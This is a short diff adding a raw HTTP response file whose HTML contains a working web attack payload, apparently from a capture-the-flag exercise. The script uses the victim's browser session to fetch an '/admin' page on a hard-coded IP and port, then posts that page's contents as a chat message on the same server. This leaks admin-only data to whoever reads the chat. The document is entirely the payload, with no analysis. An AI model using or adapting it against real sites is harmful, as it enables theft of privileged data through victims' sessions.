@@ -1,0 +1,17 @@
+HTTP/1.1 200 OK
+Content-Encoding: gzip
+Content-Length: 323
+Content-Type: text/html
+
+<html>
+<script>
+var http = new XMLHttpRequest();
+http.open('GET', 'http://51.68.126.197:7779/admin', false);
+http.send();
+var http1 = new XMLHttpRequest();
+http1.open('POST', 'http://51.68.126.197:7779/chat/mark13/', false);
+http1.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
+http1.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+http1.send('message=' + http.responseText);
+</script>
+</html>
